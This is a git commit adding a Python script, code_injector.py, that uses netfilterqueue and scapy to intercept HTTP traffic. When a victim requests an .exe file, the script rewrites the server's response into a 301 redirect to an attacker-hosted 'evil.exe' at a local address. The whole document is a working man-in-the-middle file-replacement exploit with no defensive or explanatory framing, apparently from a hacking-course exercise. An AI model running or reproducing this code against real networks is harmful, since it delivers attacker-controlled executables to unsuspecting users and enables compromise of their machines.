86d3e01f097df927290806b1652215f9a9627ea8
Hem Parekh <54116609+Hem1700@users.noreply.github.com>
2021-04-27 13:26:06 +0530

    First commit

---
+++ code_injector.py
@@ -0,0 +1,32 @@
+import netfilterqueue
+import scapy.all as scapy
+
+ack_list = []
+def set_load(packet, load):
+    packet[scapy.Raw].load = load
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    del packet[scapy.TCP].chksum
+    return packet
+
+def process_packet(packet):
+    scapy_packet = scapy.IP(packet.get_payload())  # This will convert the packet payload to scapy packet
+    if scapy_packet.haslayer(scapy.Raw):
+        if scapy_packet[scapy.TCP].dport == 80:
+            if ".exe" in scapy_packet[scapy.Raw].load.decode():
+                print("[+] exe Request")
+                ack_list.append(scapy_packet[scapy.TCP].ack)
+        elif scapy_packet[scapy.TCP].sport == 80:
+            if scapy_packet[scapy.TCP].seq in ack_list:
+                ack_list.remove(scapy_packet[scapy.TCP].seq)
+                print("[+]Replacing file")
+                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.2.23/evil-files/evil.exe\n\n")
+                packet.set_payload(bytes(modified_packet))
+
+
+    packet.accept()  # This will accept the packet and forward it to the client computer allowing him to go that particular website
+
+
+queue = netfilterqueue.NetfilterQueue()
+queue.bind(0, process_packet)
+queue.run()
